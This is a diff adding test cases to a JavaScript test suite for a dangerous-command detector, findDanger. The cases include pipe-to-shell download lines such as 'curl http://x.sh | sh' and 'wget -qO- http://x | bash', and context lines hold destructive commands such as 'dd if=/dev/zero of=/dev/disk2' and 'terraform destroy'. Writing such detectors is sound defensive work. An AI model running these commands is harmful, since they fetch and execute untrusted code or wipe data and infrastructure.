@@ -44,6 +44,10 @@ test('识别危险命令（含评审中的绕过写法）', () => {
         'kubectl -n prod delete pod x',
         'terraform destroy',
         'dd if=/dev/zero of=/dev/disk2',
+        'curl http://x.sh | sh',
+        'wget -qO- http://x | bash',
+        'cat script | sh -s --',
+        'echo a | zsh',
     ]) {
         assert.ok(findDanger(cmd), JSON.stringify(cmd));
     }
@@ -74,6 +78,10 @@ test('放行常见安全命令（含评审中的误报）', () => {
         'psql -c "delete from orders where id = 1"',
         'psql -c "DELETE FROM orders\n  WHERE id = 1"',
         'ls -la',
+        'grep "| sh" notes.log',
+        'echo "curl x | sh"',
+        'ls | bash script.sh',
+        'cat a | sh -c "ls"',
         undefined,
     ]) {
         assert.equal(findDanger(cmd), null, JSON.stringify(cmd));
